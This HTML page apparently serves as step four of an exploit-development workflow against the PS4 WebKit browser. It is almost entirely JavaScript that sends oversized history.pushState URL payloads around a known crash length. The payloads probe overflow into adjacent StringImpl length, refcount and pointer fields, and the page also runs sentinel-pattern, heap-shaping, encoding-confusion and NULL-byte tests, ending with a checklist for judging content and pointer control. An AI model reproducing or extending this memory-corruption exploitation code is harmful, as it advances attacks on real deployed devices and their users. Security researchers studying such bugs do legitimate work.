<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Step 4</title>

</head>
<body>

<h2>STEP 4: Neighbor Identification Tests</h2>
<p class="info">Known crash: size 977 + 14461 | Safe: size 977 + 14460</p>

<div class="test-section">
<h3>TEST 4.1 - Controlled Byte Impact</h3>
<button onclick="test41_byteImpact()">RUN 4.1</button>
<p>Tests if changing the CONTENT of overflow byte changes crash behavior</p>
</div>

<div class="test-section">
<h3>TEST 4.2 - Sentinel Patterns</h3>
<button onclick="test42_sentinelPatterns()">RUN 4.2</button>
<p>Tests if specific byte patterns appear in crash behavior</p>
</div>

<div class="test-section">
<h3>TEST 4.3 - UTF-16 vs UTF-8 Edge Cases</h3>
<button onclick="test43_encodingEdges()">RUN 4.3</button>
<p>Tests encoding-based size confusion (common WebKit bug)</p>
</div>

<div class="test-section">
<h3>TEST 4.4 - StringImpl Adjacent Corruption</h3>
<button onclick="test44_stringImplTarget()">RUN 4.4</button>
<p>Tests if overflow corrupts adjacent StringImpl structure</p>
</div>

<div class="test-section">
<h3>TEST 4.5 - Heap Layout Influence</h3>
<button onclick="test45_heapShaping()">RUN 4.5</button>
<p>Tests if heap shaping changes crash behavior (confirms neighbor sensitivity)</p>
</div>

<div class="test-section">
<h3>TEST 4.6 - NULL Byte Termination</h3>
<button onclick="test46_nullByte()">RUN 4.6</button>
<p>Tests if NULL byte prevents/changes crash (indicates string length corruption)</p>
</div>

<div class="test-section">
<button onclick="runAllTests()" style="background: #f00; color: #fff; font-size: 16px; font-weight: bold;">‚ö†Ô∏è RUN ALL TESTS (MAY CRASH)</button>
<button onclick="clearLog()">Clear Log</button>
</div>

<div id="log"></div>

<script>
const SAFE_BASE = 977;
const SAFE_OFFSET = 14460;
const CRASH_OFFSET = 14461;

function log(msg, type = 'info') {
    const logEl = document.getElementById("log");
    const timestamp = new Date().toLocaleTimeString();
    const className = type;
    logEl.innerHTML += `<span class="${className}">[${timestamp}] ${msg}</span>\n`;
    logEl.scrollTop = logEl.scrollHeight;
}

function clearLog() {
    document.getElementById("log").innerHTML = '';
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// TEST 4.1 - Controlled Byte Impact
async function test41_byteImpact() {
    log('=== TEST 4.1: Controlled Byte Impact ===', 'critical');
    log('Testing if changing overflow byte CONTENT changes crash behavior', 'info');
    
    const basePayload = "A".repeat(SAFE_BASE);
    const testBytes = [
        { name: 'All A', char: 'A', repeat: CRASH_OFFSET },
        { name: 'All B', char: 'B', repeat: CRASH_OFFSET },
        { name: 'All C', char: 'C', repeat: CRASH_OFFSET },
        { name: 'All X', char: 'X', repeat: CRASH_OFFSET },
        { name: 'All Z', char: 'Z', repeat: CRASH_OFFSET },
        { name: 'A + last B', char: 'A', repeat: CRASH_OFFSET - 1, last: 'B' },
        { name: 'A + last 0', char: 'A', repeat: CRASH_OFFSET - 1, last: String.fromCharCode(0) },
        { name: 'A + last FF', char: 'A', repeat: CRASH_OFFSET - 1, last: String.fromCharCode(255) }
    ];
    
    for (let i = 0; i < testBytes.length; i++) {
        const test = testBytes[i];
        try {
            await delay(100);
            let payload = basePayload + test.char.repeat(test.repeat);
            if (test.last) payload += test.last;
            
            log(`  [${i+1}/${testBytes.length}] Testing: ${test.name}`, 'warn');
            history.pushState({}, "", "#" + payload);
            log(`    ‚úì Survived (size: ${payload.length})`, 'pass');
            
        } catch(e) {
            log(`    ‚úó Exception: ${e.message}`, 'critical');
        }
    }
    
    log('TEST 4.1 completed - analyze if different bytes cause different behavior\n', 'info');
}

// TEST 4.2 - Sentinel Patterns
async function test42_sentinelPatterns() {
    log('=== TEST 4.2: Sentinel Patterns ===', 'critical');
    log('Testing classic exploitation patterns', 'info');
    
    const patterns = [
        { name: 'AAAA pattern', pattern: 'AAAA' },
        { name: 'BBBB pattern', pattern: 'BBBB' },
        { name: 'CCCC pattern', pattern: 'CCCC' },
        { name: 'ABAB pattern', pattern: 'ABAB' },
        { name: 'BABA pattern', pattern: 'BABA' },
        { name: 'DEADBEEF', pattern: 'DEAD' },
        { name: '41414141', pattern: String.fromCharCode(0x41, 0x41, 0x41, 0x41) },
        { name: '42424242', pattern: String.fromCharCode(0x42, 0x42, 0x42, 0x42) }
    ];
    
    for (let i = 0; i < patterns.length; i++) {
        const test = patterns[i];
        try {
            await delay(100);
            const base = "A".repeat(SAFE_BASE);
            const filling = test.pattern.repeat(Math.floor(CRASH_OFFSET / test.pattern.length));
            const payload = base + filling + test.pattern.substring(0, CRASH_OFFSET - filling.length);
            
            log(`  [${i+1}/${patterns.length}] Testing: ${test.name}`, 'warn');
            history.pushState({}, "", "#" + payload);
            log(`    ‚úì Survived with pattern`, 'pass');
            
        } catch(e) {
            log(`    ‚úó Crashed with: ${e.message}`, 'critical');
        }
    }
    
    log('TEST 4.2 completed - check if patterns influence crash\n', 'info');
}

// TEST 4.3 - UTF-16 vs UTF-8 Edge Cases
async function test43_encodingEdges() {
    log('=== TEST 4.3: UTF-16 vs UTF-8 Edge Cases ===', 'critical');
    log('Testing encoding confusion bugs (common in WebKit)', 'info');
    
    const encodingTests = [
        { name: 'ASCII only (A)', char: 'A' },
        { name: 'Latin-1 (√©)', char: '√©' },
        { name: 'Cyrillic (–Ø)', char: '–Ø' },
        { name: 'Emoji (üî•)', char: 'üî•' },
        { name: 'Musical (ùÑû)', char: 'ùÑû' },
        { name: 'Zero-width', char: '\u200B' },
        { name: 'Combining char', char: 'e\u0301' },
        { name: 'Null char', char: '\u0000' },
        { name: 'High surrogate area', char: '\uD800' }
    ];
    
    for (let i = 0; i < encodingTests.length; i++) {
        const test = encodingTests[i];
        try {
            await delay(100);
            
            // Calculate logical length vs byte length
            const payload = test.char.repeat(SAFE_BASE + CRASH_OFFSET);
            const logicalLen = payload.length;
            const byteLen = new Blob([payload]).size;
            
            log(`  [${i+1}/${encodingTests.length}] Testing: ${test.name}`, 'warn');
            log(`    Logical: ${logicalLen} | Bytes: ${byteLen}`, 'info');
            
            history.pushState({}, "", "#" + payload);
            log(`    ‚úì Survived`, 'pass');
            
        } catch(e) {
            log(`    ‚úó Crashed: ${e.message}`, 'critical');
        }
    }
    
    log('TEST 4.3 completed - encoding bugs are gold in WebKit\n', 'info');
}

// TEST 4.4 - StringImpl Adjacent Corruption
async function test44_stringImplTarget() {
    log('=== TEST 4.4: StringImpl Adjacent Corruption ===', 'critical');
    log('Testing if overflow corrupts adjacent StringImpl fields', 'info');
    
    // Try to corrupt potential StringImpl fields: length, refcount, pointer
    const corruptionTests = [
        { name: 'Length=0', bytes: [0, 0, 0, 0] },
        { name: 'Length=MAX', bytes: [0xFF, 0xFF, 0xFF, 0xFF] },
        { name: 'Length=1', bytes: [1, 0, 0, 0] },
        { name: 'RefCount=0', bytes: [0, 0, 0, 0] },
        { name: 'Pointer low bits', bytes: [0x41, 0x41, 0, 0] },
        { name: 'Pointer pattern', bytes: [0x41, 0x41, 0x41, 0x41] },
        { name: 'Flag flip', bytes: [1, 0, 0, 0] },
        { name: 'Mixed pattern', bytes: [0xAA, 0xBB, 0xCC, 0xDD] }
    ];
    
    for (let i = 0; i < corruptionTests.length; i++) {
        const test = corruptionTests[i];
        try {
            await delay(100);
            
            const base = "A".repeat(SAFE_BASE + SAFE_OFFSET);
            let corruption = '';
            for (let b of test.bytes) {
                corruption += String.fromCharCode(b);
            }
            const payload = base + corruption;
            
            log(`  [${i+1}/${corruptionTests.length}] Testing: ${test.name}`, 'warn');
            history.pushState({}, "", "#" + payload);
            log(`    ‚úì Survived corruption attempt`, 'pass');
            
        } catch(e) {
            log(`    ‚úó Crashed: ${e.message}`, 'critical');
            log(`    ‚ö†Ô∏è  CRITICAL: ${test.name} triggered crash!`, 'critical');
        }
    }
    
    log('TEST 4.4 completed - StringImpl corruption is key target\n', 'info');
}

// TEST 4.5 - Heap Layout Influence
async function test45_heapShaping() {
    log('=== TEST 4.5: Heap Layout Influence ===', 'critical');
    log('Testing if heap shaping changes crash behavior', 'info');
    
    // Shape heap with different patterns
    const shapingTests = [
        { name: 'No shaping', prep: () => {} },
        { name: 'Small strings', prep: () => {
            for(let i = 0; i < 100; i++) {
                history.pushState({}, "", "#small" + i);
            }
        }},
        { name: 'Medium strings', prep: () => {
            for(let i = 0; i < 50; i++) {
                history.pushState({}, "", "#" + "M".repeat(500));
            }
        }},
        { name: 'Large safe strings', prep: () => {
            for(let i = 0; i < 10; i++) {
                history.pushState({}, "", "#" + "L".repeat(SAFE_BASE + SAFE_OFFSET - 100));
            }
        }},
        { name: 'Circular objects', prep: () => {
            for(let i = 0; i < 20; i++) {
                const obj = {data: "X".repeat(100)};
                obj.self = obj;
                try { history.pushState(obj, "", "#circ" + i); } catch(e) {}
            }
        }},
        { name: 'Deep recursion', prep: () => {
            function chain(d) { return d === 0 ? {end: true} : {next: chain(d-1)}; }
            for(let i = 0; i < 10; i++) {
                try { history.pushState(chain(50), "", "#deep" + i); } catch(e) {}
            }
        }}
    ];
    
    for (let i = 0; i < shapingTests.length; i++) {
        const test = shapingTests[i];
        try {
            await delay(200);
            
            log(`  [${i+1}/${shapingTests.length}] Shaping: ${test.name}`, 'warn');
            test.prep();
            await delay(100);
            
            const payload = "A".repeat(SAFE_BASE + CRASH_OFFSET);
            history.pushState({}, "", "#crash_after_" + test.name.replace(/\s/g, '_'));
            log(`    ‚úì Survived after ${test.name}`, 'pass');
            
        } catch(e) {
            log(`    ‚úó Crashed after ${test.name}: ${e.message}`, 'critical');
            log(`    ‚ö†Ô∏è  Heap layout matters!`, 'critical');
        }
    }
    
    log('TEST 4.5 completed - heap sensitivity indicates neighbor influence\n', 'info');
}

// TEST 4.6 - NULL Byte Termination
async function test46_nullByte() {
    log('=== TEST 4.6: NULL Byte Termination ===', 'critical');
    log('Testing NULL byte behavior (string length corruption indicator)', 'info');
    
    const nullTests = [
        { name: 'NULL at overflow start', pos: 0 },
        { name: 'NULL at +1 byte', pos: 1 },
        { name: 'NULL at +2 bytes', pos: 2 },
        { name: 'NULL at +3 bytes', pos: 3 },
        { name: 'NULL at +4 bytes', pos: 4 },
        { name: 'Double NULL', pos: 0, double: true },
        { name: 'NULL every 4 bytes', pattern: true }
    ];
    
    for (let i = 0; i < nullTests.length; i++) {
        const test = nullTests[i];
        try {
            await delay(100);
            
            let payload = "A".repeat(SAFE_BASE + SAFE_OFFSET);
            
            if (test.pattern) {
                // NULL every 4 bytes in overflow zone
                for (let j = 0; j < CRASH_OFFSET; j++) {
                    payload += (j % 4 === 0) ? '\u0000' : 'A';
                }
            } else {
                payload += "A".repeat(test.pos) + '\u0000';
                if (test.double) payload += '\u0000';
                payload += "A".repeat(CRASH_OFFSET - test.pos - (test.double ? 2 : 1));
            }
            
            log(`  [${i+1}/${nullTests.length}] Testing: ${test.name}`, 'warn');
            history.pushState({}, "", "#" + payload);
            log(`    ‚úì Survived with NULL`, 'pass');
            
        } catch(e) {
            log(`    ‚úó Still crashed: ${e.message}`, 'critical');
        }
    }
    
    log('TEST 4.6 completed - NULL behavior reveals string handling\n', 'info');
}

// Run all tests sequentially
async function runAllTests() {
    if (!confirm('‚ö†Ô∏è WARNING: This will run all tests and may crash the browser.\n\nProceed?')) {
        return;
    }
    
    clearLog();
    log('========================================', 'critical');
    log('STEP 4: COMPLETE NEIGHBOR IDENTIFICATION', 'critical');
    log('========================================\n', 'critical');
    
    await test41_byteImpact();
    await delay(500);
    
    await test42_sentinelPatterns();
    await delay(500);
    
    await test43_encodingEdges();
    await delay(500);
    
    await test44_stringImplTarget();
    await delay(500);
    
    await test45_heapShaping();
    await delay(500);
    
    await test46_nullByte();
    
    log('\n========================================', 'critical');
    log('ALL TESTS COMPLETED', 'critical');
    log('========================================', 'critical');
    log('\nANALYSIS CHECKLIST:', 'warn');
    log('‚úì Did different byte values cause different crashes? ‚Üí Content control', 'info');
    log('‚úì Did sentinel patterns appear in crash addresses? ‚Üí Pointer control', 'info');
    log('‚úì Did encoding change crash behavior? ‚Üí Size confusion bug', 'info');
    log('‚úì Did specific 4-byte patterns trigger crashes? ‚Üí Structure field corruption', 'info');
    log('‚úì Did heap shaping change results? ‚Üí Neighbor confirmed', 'info');
    log('‚úì Did NULL bytes prevent crash? ‚Üí String length corruption', 'info');
}

log('Step 4 tests loaded. Run individual tests or ALL tests.', 'pass');
log('Known crash condition: 977 + 14461 bytes', 'warn');
log('Safe condition: 977 + 14460 bytes\n', 'pass');
</script>

</body>
</html>

